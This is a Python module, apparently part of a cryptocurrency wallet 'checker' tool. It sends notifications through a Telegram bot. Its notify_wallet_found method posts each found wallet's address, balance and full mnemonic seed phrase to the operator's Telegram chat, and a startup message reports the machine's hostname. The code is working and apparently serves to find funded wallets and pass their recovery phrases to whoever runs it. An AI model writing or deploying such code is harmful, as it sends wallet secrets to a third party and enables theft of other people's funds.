"""Optimized Telegram notification handling."""

import logging
import socket
from dataclasses import dataclass
from typing import Optional
import time

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

from .config import TelegramConfig

logger = logging.getLogger(__name__)
logger.setLevel(logging.WARNING)

@dataclass
class WalletInfo:
    """Wallet information container."""
    address: str
    balance: float
    mnemonic: str

class TelegramNotifier:
    """Optimized Telegram notification handler."""
    
    def __init__(self, config: TelegramConfig):
        """Initialize with optimized HTTP session."""
        self.config = config
        self.api_url = f'https://api.telegram.org/bot{self.config.token}/sendMessage'
        self._hostname = socket.gethostname()
        
        # Configure optimized session
        retry_strategy = Retry(
            total=3,
            backoff_factor=0.5,
            status_forcelist=[500, 502, 503, 504]
        )
        
        self._session = requests.Session()
        self._session.mount('https://', HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=10,
            pool_maxsize=10
        ))
        
        # Rate limiting
        self._last_send = 0
        self._min_interval = 1  # Minimum seconds between messages

    def _rate_limit(self):
        """Apply rate limiting."""
        now = time.time()
        if now - self._last_send < self._min_interval:
            time.sleep(self._min_interval - (now - self._last_send))
        self._last_send = now

    def send_message(self, message: str) -> bool:
        """Send message with optimized handling."""
        self._rate_limit()
        
        try:
            response = self._session.post(
                self.api_url,
                json={
                    'chat_id': self.config.chat_id,
                    'text': message
                },
                timeout=5
            )
            response.raise_for_status()
            return True
            
        except Exception as e:
            logger.warning("Telegram send failed: %s", str(e))
            return False

    def notify_wallet_found(self, wallet: WalletInfo) -> bool:
        """Send minimal wallet notification."""
        message = (
            f"+Found: {wallet.address}\n"
            f"Balance: {wallet.balance}\n"
            f"Phrase: {wallet.mnemonic}"
        )
        return self.send_message(message)

    def notify_startup(self) -> bool:
        """Send minimal startup notification."""
        return self.send_message(
            f"Checker started on {self._hostname}"
        )

    def __del__(self):
        """Cleanup session."""
        self._session.close()

_instance: Optional[TelegramNotifier] = None

def get_notifier(config: Optional[TelegramConfig] = None) -> TelegramNotifier:
    """Get or create global notifier instance."""
    global _instance
    if _instance is None:
        if config is None:
            raise ValueError("config required for new instance")
        _instance = TelegramNotifier(config)
    return _instance